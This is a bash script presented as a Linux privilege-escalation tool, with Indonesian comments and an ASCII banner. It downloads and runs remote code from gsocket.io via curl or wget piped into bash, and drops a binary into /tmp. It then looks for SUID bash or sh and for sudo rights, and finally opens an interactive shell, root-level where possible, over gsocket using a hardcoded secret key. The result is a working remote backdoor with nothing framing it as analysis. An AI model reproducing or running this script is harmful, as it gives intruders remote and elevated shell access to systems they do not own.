#!/bin/bash
# groot_simple_fixed.sh

SECRET_KEY="CbadUt4YWKZmnNunoxGEmx"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Banner
echo -e "${GREEN}"
echo "   ▄████████  ▄████████    ▄████████    ▄████████ "
echo "  ███    ███ ███    ███   ███    ███   ███    ███ "
echo "  ███    █▀  ███    █▀    ███    █▀    ███    █▀  "
echo " ▄███▄▄▄     ███         ▄███▄▄▄       ███        "
echo "▀▀███▀▀▀     ███        ▀▀███▀▀▀     ▀███████████ "
echo "  ███    █▄  ███    █▄    ███    █▄           ███ "
echo "  ███    ███ ███    ███   ███    ███    ▄█    ███ "
echo "  ██████████ ████████▀    ██████████  ▄████████▀  "
echo -e "${NC}"
echo "             Linux Privilege Escalation"
echo ""

# Install gsocket dengan cara yang benar
install_gsocket() {
    echo -e "${YELLOW}[*] Installing gsocket...${NC}"
    
    # Method yang benar
    if command -v curl &> /dev/null; then
        GS_NOINST=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>/dev/null
    elif command -v wget &> /dev/null; then
        GS_NOINST=1 bash -c "$(wget -qO- https://gsocket.io/y)" 2>/dev/null
    else
        echo -e "${RED}[-] Need curl or wget to install gsocket${NC}"
        return 1
    fi
    
    # Cek apakah install berhasil
    if command -v gsocket &> /dev/null; then
        echo -e "${GREEN}[+] gsocket installed successfully!${NC}"
        return 0
    else
        echo -e "${RED}[-] gsocket installation failed${NC}"
        return 1
    fi
}

# Cek dan install gsocket
if ! command -v gsocket &> /dev/null; then
    install_gsocket
fi

# Jika gsocket tidak ada, coba manual install
if ! command -v gsocket &> /dev/null; then
    echo -e "${YELLOW}[*] Trying manual install...${NC}"
    cd /tmp
    curl -fsSL https://gsocket.io/x > gsocket.bin 2>/dev/null || \
    wget -qO gsocket.bin https://gsocket.io/x 2>/dev/null
    chmod +x gsocket.bin 2>/dev/null
    ./gsocket.bin --help >/dev/null 2>&1 && export PATH="/tmp:$PATH"
fi

# Quick privilege check
echo -e "\n${YELLOW}[*] Quick System Check:${NC}"
echo "User: $(whoami)"
echo "ID: $(id)"
echo ""

# Cek SUID binaries dengan cepat
echo -e "${YELLOW}[*] Checking for SUID binaries...${NC}"
SUID_BINARIES=$(find / -perm -4000 -type f 2>/dev/null | head -10)
if [ -n "$SUID_BINARIES" ]; then
    echo "$SUID_BINARIES"
    
    # Cek khusus bash/sh
    if echo "$SUID_BINARIES" | grep -q "/bin/bash"; then
        echo -e "${GREEN}[+] FOUND: SUID bash - Ready for root!${NC}"
        ROOT_READY=true
    elif echo "$SUID_BINARIES" | grep -q "/bin/sh"; then
        echo -e "${GREEN}[+] FOUND: SUID sh - Ready for root!${NC}"
        ROOT_READY=true
    fi
else
    echo "No SUID binaries found"
fi

# Cek sudo permissions
echo -e "\n${YELLOW}[*] Checking sudo permissions...${NC}"
SUDO_PERMS=$(sudo -l 2>/dev/null)
if [ -n "$SUDO_PERMS" ]; then
    echo "$SUDO_PERMS"
    if echo "$SUDO_PERMS" | grep -q "(ALL)"; then
        echo -e "${GREEN}[+] Can run ALL commands with sudo!${NC}"
        SUDO_READY=true
    fi
else
    echo "No sudo permissions"
fi

# Connect via gsocket
echo -e "\n${YELLOW}[*] Connecting via gsocket...${NC}"
echo -e "[*] Using secret: ${SECRET_KEY:0:10}..."
echo "=============================================="

if command -v gsocket &> /dev/null || [ -f "/tmp/gsocket.bin" ]; then
    GS_CMD=$(command -v gsocket || echo "/tmp/gsocket.bin")
    
    if [ "$ROOT_READY" = true ]; then
        echo -e "${GREEN}[+] Attempting root shell...${NC}"
        $GS_CMD -s "$SECRET_KEY" /bin/bash -p -i
    elif [ "$SUDO_READY" = true ]; then
        echo -e "${GREEN}[+] Attempting sudo shell...${NC}"
        sudo $GS_CMD -s "$SECRET_KEY" /bin/bash -i
    else
        echo -e "${YELLOW}[+] Starting user shell...${NC}"
        $GS_CMD -s "$SECRET_KEY" /bin/bash -i
    fi
else
    echo -e "${RED}[-] gsocket not available${NC}"
    echo "[*] Try manual install:"
    echo "    GS_NOINST=1 bash -c \"\$(curl -fsSL https://gsocket.io/y)\""
fi
